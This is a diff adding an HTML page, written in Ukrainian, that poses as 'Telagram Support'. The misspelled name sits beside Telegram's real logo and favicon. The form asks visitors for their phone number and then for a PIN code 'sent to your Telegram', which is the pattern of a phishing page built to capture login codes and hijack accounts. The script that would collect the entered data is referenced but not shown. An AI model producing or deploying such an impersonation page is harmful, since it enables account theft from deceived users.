@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telagram Support</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="https://telegram.org/favicon.ico">
+</head>
+<body>
+    <div class="support-container">
+        <div class="header">
+            <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo" class="logo">
+            <h1>Telagram Support</h1>
+            <p id="stepText">Введіть ваш номер телефону для підтвердження</p>
+        </div>
+
+        <form id="supportForm">
+            <!-- Крок 1: Номер телефону -->
+            <div class="form-group" id="phoneStep">
+                <label for="phone">Номер телефону</label>
+                <input type="tel" id="phone" class="form-control" placeholder="+380123456789" required>
+                <button type="button" id="nextBtn" class="btn">Далі</button>
+            </div>
+
+            <!-- Крок 2: PIN-код (прихований спочатку) -->
+            <div class="form-group" id="pinStep" style="display: none;">
+                <label for="pin">Перевірте Telegram та введіть 4-значний PIN</label>
+                <input type="password" id="pin" class="form-control" placeholder="••••" maxlength="4" required>
+                <p class="hint">Код надіслано у ваш Telegram.</p>
+                <button type="submit" class="btn">Підтвердити</button>
+            </div>
+
+            <div class="loading" id="loading">
+                <div class="spinner"></div> <span id="loadingText">Перевірка...</span>
+            </div>
+        </form>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
